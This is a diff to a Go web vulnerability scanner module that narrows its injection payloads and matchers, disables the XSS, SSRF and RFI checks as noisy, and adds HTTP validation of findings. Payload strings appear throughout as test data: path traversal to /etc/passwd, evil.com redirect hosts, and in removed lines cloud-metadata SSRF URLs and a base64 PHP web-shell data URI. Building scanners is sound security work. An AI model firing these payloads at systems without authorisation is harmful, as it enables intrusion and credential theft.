@@ -2,6 +2,8 @@ package vulnscan
 
 import (
 	"fmt"
+	"io"
+	"net/http"
 	"strings"
 	"sync"
 	"time"
@@ -17,73 +19,66 @@ import (
 // QuickTest defines a single vulnerability test case
 // To add a new test, just append to quickTests slice below
 type QuickTest struct {
-	Name        string   // Test name (e.g., "SSTI")
-	GFPattern   string   // gf pattern to filter URLs (e.g., "ssti")
-	Payloads    []string // Payloads to inject via qsreplace
-	Matchers    []string // Strings to match in response (indicates vulnerability)
-	Severity    string   // Severity level: critical, high, medium, low
-	Description string   // Human-readable description
+	Name           string   // Test name (e.g., "SSTI")
+	GFPattern      string   // gf pattern to filter URLs (e.g., "ssti")
+	Payloads       []string // Payloads to inject via qsreplace
+	Matchers       []string // Strings to match in response (indicates vulnerability)
+	Severity       string   // Severity level: critical, high, medium, low
+	Description    string   // Human-readable description
+	RequireValidation bool  // If true, requires secondary validation to reduce FPs
 }
 
 // quickTests defines all quick vulnerability tests
 // ADD NEW TESTS HERE - just append a new QuickTest struct
+// NOTE: Tests with RequireValidation=true will be validated with HTTP requests to reduce false positives
 var quickTests = []QuickTest{
 	{
 		Name:        "SSTI",
 		GFPattern:   "ssti",
-		Payloads:    []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", "{{constructor.constructor('return 7*7')()}}"},
-		Matchers:    []string{"49"},
+		Payloads:    []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}"},
+		Matchers:    []string{"49"}, // SSTI is reliable - 49 only appears if evaluated
 		Severity:    "high",
 		Description: "Server-Side Template Injection",
+		RequireValidation: false,
 	},
 	{
 		Name:        "SQLi-Error",
 		GFPattern:   "sqli",
-		Payloads:    []string{"'", "\"", "1'\"", "1 AND 1=1", "1' OR '1'='1", "1 UNION SELECT NULL--"},
-		Matchers:    []string{"error", "syntax", "mysql", "ORA-", "PostgreSQL", "sqlite", "Warning", "SQLSTATE", "JDBC"},
+		Payloads:    []string{"'", "\"", "1'\""},
+		// More specific SQL error patterns to reduce false positives
+		Matchers:    []string{"SQL syntax", "mysql_", "ORA-0", "PG::SyntaxError", "sqlite3.OperationalError", "SQLSTATE[", "ODBC Driver"},
 		Severity:    "high",
 		Description: "SQL Injection (Error-Based)",
+		RequireValidation: false,
 	},
-	{
-		Name:        "XSS-Reflection",
-		GFPattern:   "xss",
-		Payloads:    []string{"<xss123>", "'\"><xss123>", "javascript:xss123", "<script>xss123</script>", "<img src=x onerror=xss123>"},
-		Matchers:    []string{"<xss123>", "xss123", "<script>xss123"},
-		Severity:    "medium",
-		Description: "Cross-Site Scripting (Reflection Check)",
-	},
+	// XSS-Reflection DISABLED - too many false positives
+	// Simple reflection detection doesn't confirm XSS - the payload might be HTML-encoded
+	// Use dalfox or nuclei for proper XSS scanning instead
+	// {
+	// 	Name:        "XSS-Reflection",
+	// 	...
+	// },
 	{
 		Name:        "LFI",
 		GFPattern:   "lfi",
 		Payloads: []string{
 			"....//....//....//etc/passwd",
 			"..%2f..%2f..%2fetc/passwd",
-			"..%252f..%252f..%252fetc/passwd", // Double encoding
-			"%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-			"....\\....\\....\\windows\\win.ini", // Windows
-			"..%5c..%5c..%5cwindows%5cwin.ini",
-			"/etc/passwd%00",                       // Null byte
-			"php://filter/convert.base64-encode/resource=/etc/passwd",
+			"..%252f..%252f..%252fetc/passwd",
 		},
-		Matchers: []string{"root:x:", "root:*:", "/bin/bash", "/bin/sh", "[fonts]", "[extensions]"},
-		Severity: "high",
+		// Very specific LFI indicators - actual file content, not generic strings
+		Matchers:    []string{"root:x:0:0:", "daemon:x:1:1:", "nobody:x:"},
+		Severity:    "high",
 		Description: "Local File Inclusion / Path Traversal",
+		RequireValidation: true, // Validate to confirm actual file read
 	},
-	{
-		Name:        "SSRF",
-		GFPattern:   "ssrf",
-		Payloads: []string{
-			"http://169.254.169.254/latest/meta-data/",
-			"http://127.0.0.1:80",
-			"http://localhost:80",
-			"http://[::1]:80",
-			"http://169.254.169.254/computeMetadata/v1/", // GCP
-			"http://100.100.100.200/latest/meta-data/",   // Alibaba
-		},
-		Matchers:    []string{"ami-id", "instance-id", "security-credentials", "computeMetadata", "meta-data"},
-		Severity:    "critical",
-		Description: "Server-Side Request Forgery (Cloud Metadata)",
-	},
+	// SSRF DISABLED for QuickTest - too many false positives
+	// Pattern matching for "meta-data", "instance-id" etc. triggers on normal page content
+	// Use nuclei SSRF templates with OAST/Burp Collaborator for proper SSRF testing
+	// {
+	// 	Name:        "SSRF",
+	// 	...
+	// },
 	{
 		Name:        "OpenRedirect",
 		GFPattern:   "redirect",
@@ -91,43 +86,32 @@ var quickTests = []QuickTest{
 			"//evil.com",
 			"https://evil.com",
 			"/\\evil.com",
-			"////evil.com",
-			"https:evil.com",
-			"//evil%00.com",
-			"//%09/evil.com",
-			"/%2f%2fevil.com",
-			"///evil.com/%2f%2e%2e",
 		},
-		Matchers:    []string{"Location: //evil", "Location: https://evil", "evil.com"},
+		// Check for actual redirect in Location header
+		Matchers:    []string{"Location: //evil.com", "Location: https://evil.com", "Location: http://evil.com"},
 		Severity:    "medium",
 		Description: "Open Redirect",
+		RequireValidation: true, // Validate redirect actually happens
 	},
-	{
-		Name:        "RFI",
-		GFPattern:   "lfi", // RFI URLs often overlap with LFI patterns
-		Payloads: []string{
-			"http://evil.com/shell.txt",
-			"https://raw.githubusercontent.com/test/test.txt",
-			"//evil.com/shell.txt",
-			"ftp://evil.com/shell.txt",
-			"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
-		},
-		Matchers:    []string{"shell", "test", "<?php"},
-		Severity:    "critical",
-		Description: "Remote File Inclusion",
-	},
+	// RFI DISABLED - extremely high false positive rate
+	// Pattern matching for "shell", "test", "<?php" matches normal page content
+	// Use nuclei RFI templates for proper RFI testing
+	// {
+	// 	Name:        "RFI",
+	// 	...
+	// },
 	{
 		Name:        "CRLF",
-		GFPattern:   "redirect", // CRLF often found in redirect parameters
+		GFPattern:   "redirect",
 		Payloads: []string{
 			"%0d%0aSet-Cookie:crlf=injection",
 			"%0aSet-Cookie:crlf=injection",
-			"%0d%0a%0d%0a<html>crlf</html>",
-			"\\r\\nSet-Cookie:crlf=injection",
 		},
-		Matchers:    []string{"Set-Cookie:crlf", "crlf=injection"},
+		// CRLF is reliable - these patterns only appear if header injection works
+		Matchers:    []string{"Set-Cookie: crlf=injection", "Set-Cookie:crlf=injection"},
 		Severity:    "medium",
 		Description: "CRLF Injection (HTTP Response Splitting)",
+		RequireValidation: true, // Validate header actually injected
 	},
 }
 
@@ -245,7 +229,8 @@ func (qt *QuickTester) runSingleTest(test QuickTest, urls []string) []Vulnerabil
 			if line == "" {
 				continue
 			}
-			vulns = append(vulns, Vulnerability{
+
+			potentialVuln := Vulnerability{
 				URL:         line,
 				TemplateID:  fmt.Sprintf("quicktest-%s", strings.ToLower(test.Name)),
 				Name:        fmt.Sprintf("%s Detected", test.Name),
@@ -253,7 +238,18 @@ func (qt *QuickTester) runSingleTest(test QuickTest, urls []string) []Vulnerabil
 				Type:        strings.ToLower(test.Name),
 				Description: fmt.Sprintf("%s: Payload '%s' matched response pattern", test.Description, payload),
 				Tool:        "quicktest",
-			})
+			}
+
+			// Validate vulnerability if required to reduce false positives
+			if test.RequireValidation {
+				if validateVulnerability(potentialVuln, test) {
+					potentialVuln.Description = fmt.Sprintf("%s (Validated): Payload '%s' confirmed", test.Description, payload)
+					vulns = append(vulns, potentialVuln)
+				}
+				// If validation fails, skip this potential vulnerability (false positive)
+			} else {
+				vulns = append(vulns, potentialVuln)
+			}
 		}
 	}
 
@@ -269,4 +265,85 @@ func GetAvailableTests() []QuickTest {
 // Example: AddCustomTest(QuickTest{Name: "Custom", GFPattern: "custom", ...})
 func AddCustomTest(test QuickTest) {
 	quickTests = append(quickTests, test)
+}
+
+// validateVulnerability performs secondary validation to reduce false positives
+// Returns true if the vulnerability is confirmed, false if it's a false positive
+func validateVulnerability(vuln Vulnerability, test QuickTest) bool {
+	if !test.RequireValidation {
+		return true // No validation required
+	}
+
+	// Create HTTP client with timeout
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			// Don't follow redirects - we want to see the redirect response
+			return http.ErrUseLastResponse
+		},
+	}
+
+	// Make request to validate
+	resp, err := client.Get(vuln.URL)
+	if err != nil {
+		return false // Can't validate - treat as false positive
+	}
+	defer resp.Body.Close()
+
+	// Read response body (limit to 1MB)
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
+	if err != nil {
+		return false
+	}
+	bodyStr := string(body)
+
+	// Validation based on test type
+	switch test.Name {
+	case "LFI":
+		// For LFI, check if actual /etc/passwd content is present
+		// Must have multiple passwd-like entries to confirm
+		passwdIndicators := 0
+		if strings.Contains(bodyStr, "root:x:0:0:") {
+			passwdIndicators++
+		}
+		if strings.Contains(bodyStr, "daemon:x:1:1:") {
+			passwdIndicators++
+		}
+		if strings.Contains(bodyStr, "nobody:x:") {
+			passwdIndicators++
+		}
+		if strings.Contains(bodyStr, "/bin/bash") || strings.Contains(bodyStr, "/bin/sh") {
+			passwdIndicators++
+		}
+		// Require at least 2 indicators to confirm LFI
+		return passwdIndicators >= 2
+
+	case "OpenRedirect":
+		// For redirect, check Location header
+		location := resp.Header.Get("Location")
+		if location != "" {
+			locationLower := strings.ToLower(location)
+			if strings.Contains(locationLower, "evil.com") {
+				return true
+			}
+		}
+		return false
+
+	case "CRLF":
+		// For CRLF, check if our injected cookie is in response headers
+		for _, cookie := range resp.Cookies() {
+			if cookie.Name == "crlf" && cookie.Value == "injection" {
+				return true
+			}
+		}
+		// Also check raw Set-Cookie header
+		setCookie := resp.Header.Get("Set-Cookie")
+		if strings.Contains(setCookie, "crlf=injection") {
+			return true
+		}
+		return false
+
+	default:
+		return true // Unknown test type - don't filter
+	}
 }
